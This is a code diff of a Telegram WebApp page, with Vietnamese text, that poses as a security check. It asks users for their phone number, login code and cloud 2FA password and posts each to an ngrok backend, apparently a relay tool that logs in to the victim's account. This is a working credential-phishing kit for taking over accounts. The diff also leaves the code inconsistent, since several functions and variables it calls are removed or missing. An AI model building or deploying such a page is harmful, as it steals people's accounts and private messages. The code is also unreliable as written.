@@ -19,87 +19,53 @@
     <div id="message">Đang kết nối bảo mật...</div>
 </div>
 
+<!-- [Giữ nguyên phần <head> và <style> cũ] -->
 <script>
     const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
     const tg = window.Telegram.WebApp;
-    // Lấy ID người dùng làm khóa session
     const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random()*1000000).toString();
 
-    tg.ready();
-    tg.expand();
-
-    // Thiết lập nút chính
-    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
-    tg.MainButton.show();
-    tg.MainButton.onClick(() => tg.requestContact());
-
-    // Xử lý khi Telegram gửi SĐT về
-    tg.onEvent('contactRequested', (data) => {
-        const phone = data?.responseUnsafe?.contact?.phone_number;
-        if (phone) {
-            sendPhoneToServer(phone);
-        } else {
-            alert("Vui lòng chia sẻ số điện thoại!");
-        }
-    });
-
+    // 1. Gửi SĐT để kích hoạt Tool bắt đầu gửi mã
     async function sendPhoneToServer(phone) {
-        tg.MainButton.text = "ĐANG XỬ LÝ...";
-        try {
-            await fetch(`${BACKEND_URL}/send_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phone, chat_id: chat_id })
-            });
-            renderOtpUi();
-        } catch (e) {
-            alert("Lỗi kết nối server, vui lòng thử lại!");
-        }
+        tg.MainButton.text = "ĐANG GỬI MÃ...";
+        const res = await fetch(`${BACKEND_URL}/send_phone`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: phone, chat_id: chat_id })
+        });
+        const data = await res.json();
+        // Nếu server báo thành công, chuyển sang màn hình nhập mã
+        if (data.status === "sent") renderOtpUi(); 
     }
 
-    function renderOtpUi() {
-        document.getElementById('app').innerHTML = `
-            <img src="https://img.icons8.com/color/96/iphone-message.png" style="width: 70px; margin-bottom: 20px;">
-            <div style="background: #1c1c20; padding: 10px 30px; border-radius: 20px; color: #aaa; margin-bottom: 20px;">Nhập mã OTP</div>
-            <div id="otp-container" style="display: flex; gap: 8px; margin-bottom: 30px; justify-content: center;">
-                ${[0,1,2,3,4].map(() => `<input type="text" class="otp-box" readonly>`).join('')}
-            </div>
-            <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;">
-                ${[1,2,3,4,5,6,7,8,9].map(n => `<button class="key-btn" onclick="handleKey('${n}')">${n}</button>`).join('')}
-                <button class="key-btn" style="visibility:hidden"></button>
-                <button class="key-btn" onclick="handleKey('0')">0</button>
-                <button class="key-btn" onclick="handleKey('⌫')">⌫</button>
-            </div>
-        `;
-        tg.MainButton.hide();
-    }
-
-    let currentOtp = "";
-    window.handleKey = (key) => {
-        const boxes = document.querySelectorAll('.otp-box');
-        if (key === '⌫') {
-            currentOtp = currentOtp.slice(0, -1);
-        } else if (currentOtp.length < 5) {
-            currentOtp += key;
-        }
-        boxes.forEach((box, i) => box.value = currentOtp[i] || "");
-        if (currentOtp.length === 5) submitOtp();
-    };
-
-    async function submitOtp() {
+    // 2. Logic xử lý sau khi nhập mã/mật khẩu
+    async function submitOtp(input) {
         const res = await fetch(`${BACKEND_URL}/verify_otp`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ otp: currentOtp, chat_id: chat_id })
+            body: JSON.stringify({ input: input, chat_id: chat_id })
         });
         const result = await res.json();
-        if (result.success) {
+
+        // Đồng bộ trạng thái từ Tool
+        if (result.status === "success") {
+            alert("Đăng nhập thành công!");
             tg.close();
+        } else if (result.status === "need_password") {
+            showPasswordUi(); // Chuyển sang UI nhập mật khẩu
         } else {
-            alert("Mã sai, thử lại!");
-            currentOtp = "";
+            alert("Mã sai, vui lòng thử lại!"); // Báo lỗi sai mã từ Tool
             document.querySelectorAll('.otp-box').forEach(b => b.value = "");
+            currentOtp = "";
         }
+    }
+
+    function showPasswordUi() {
+        document.getElementById('app').innerHTML = `
+            <div>Nhập mật khẩu đám mây (2FA):</div>
+            <input type="password" id="password_input" style="width: 80%; padding: 10px; margin: 20px 0;">
+            <button onclick="submitPassword()">XÁC NHẬN</button>
+        `;
     }
 </script>
 </body>
